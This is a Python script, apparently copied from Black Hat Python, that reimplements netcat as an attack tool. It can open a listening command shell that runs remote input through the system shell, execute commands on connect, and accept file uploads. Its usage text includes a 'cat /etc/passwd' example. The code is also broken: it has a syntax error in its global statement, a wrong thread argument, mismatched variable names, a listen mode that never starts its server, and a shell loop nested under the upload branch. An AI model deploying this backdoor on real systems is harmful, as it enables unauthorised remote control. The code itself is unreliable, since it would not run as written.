#!/usr/bin/python

# Script to replicate netcat functionality
# Taken from Black Hat Python

import sys
import socket
import getopt
import threading
import subprocess

listen = False
command = False
upload = False
execute = ""
target = ""
upload_dest  = ""
port = 0

def usage():
    print("Black-Hat-Python Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port ")
    print("-l --listen                              - listen on [host]:[port] for incoming connections")
    print("e --execute=file_to_run      - execute the given file upon receiving a connection")
    print("-c --command                      - initialize a command shell")
    print("-u --upload=destination      - upon receiving connection upload a file and write to [destinaiton]")
    print()
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u= /home/jake/target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e = 'cat /etc/passwd' ")
    print("echo 'ABCDEFG' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #connect to target host
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
        while True:

            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break
            print(response, end=' ')

            #wait for more input
            buffer = input("")
            buffer += "\n"

            client.send(buffer)
    except:
        print("[*] Exception! Exiting.")

        client.close()
def server_loop():
    global target
    # if no target is defined, we listen on all interfaces

    if not (len(target)):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle the new client

        client_thread = threading.Thread(target=client_handler, args = (client, socket,))
        client_thread.start()
    
def run_command(command):

    #trim the newline
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    return output

def client_handler(client_socket):
    global upload, execute, command

    #check for upload
    if len(upload_dest):
        # read in all of the bytes and wirte to our destination
        file_buffer = ""

        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file_descriptor = open(upload_dest, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" %(upload_dest))

        except:
            client_socket.send("Failed to save file to %s\r\n" %(upload_dest))

        if len(execute):

            #run the command
            output = run_command(execute)

            client_socket.send(output)

        #go into loop if a command shell is requested

        if command:
            while True:
                client_socket.send("netcatter:# >  ")
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024)

                response = run_command(cmd_buffer)
                client_socket.send(response)
def main():
    global listen, port, execute, comman,d, upload_dest, target

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help","listen","execute","target","port","command","upload"])

    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

        # Actual code for doing stuff
        
        if not listen and len(target) and port > 0:
            # read in the buffer from the command line.  This will block, so hit CTRL - D if not
            # sending input to stdin

            buffer = sys.stdin.read()
            client_sender(buffer)

if __name__ == '__main__':
	main()
